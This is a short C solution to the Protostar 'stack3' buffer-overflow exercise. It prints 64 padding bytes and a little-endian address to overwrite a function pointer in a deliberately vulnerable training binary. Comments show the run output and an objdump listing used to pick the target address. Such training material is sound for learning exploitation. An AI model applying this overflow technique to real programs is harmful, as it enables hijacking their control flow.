#include <stdio.h>

int main(void){
    //buffer
    for(int i = 0; i < 64 ; i++){
        printf("A");
    }
    // print endianess independent
    int payload = 0x804830f; //ret
    for(int i = 0; i < 4 ; i++){
        printf("%c", ((char*)&payload)[i]);
    }
    return 0;
}


/*
user@protostar:~$ gcc stack3.c -o stack3 --std=c99
user@protostar:~$ ./stack3  | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x0804830f
user@protostar:~$ echo $?
0
*/

/*
user@protostar:~$ objdump -d /opt/protostar/bin/stack3

/opt/protostar/bin/stack3:     file format elf32-i386


Disassembly of section .init:

080482e0 <_init>:
 80482e0:       55                      push   %ebp
 80482e1:       89 e5                   mov    %esp,%ebp
 80482e3:       53                      push   %ebx
 80482e4:       83 ec 04                sub    $0x4,%esp
 80482e7:       e8 00 00 00 00          call   80482ec <_init+0xc>
 80482ec:       5b                      pop    %ebx
 80482ed:       81 c3 90 13 00 00       add    $0x1390,%ebx
 80482f3:       8b 93 fc ff ff ff       mov    -0x4(%ebx),%edx
 80482f9:       85 d2                   test   %edx,%edx
 80482fb:       74 05                   je     8048302 <_init+0x22>
 80482fd:       e8 1e 00 00 00          call   8048320 <__gmon_start__@plt>
 8048302:       e8 f9 00 00 00          call   8048400 <frame_dummy>
 8048307:       e8 e4 01 00 00          call   80484f0 <__do_global_ctors_aux>
 804830c:       58                      pop    %eax
 804830d:       5b                      pop    %ebx
 804830e:       c9                      leave
 804830f:       c3                      ret
*/
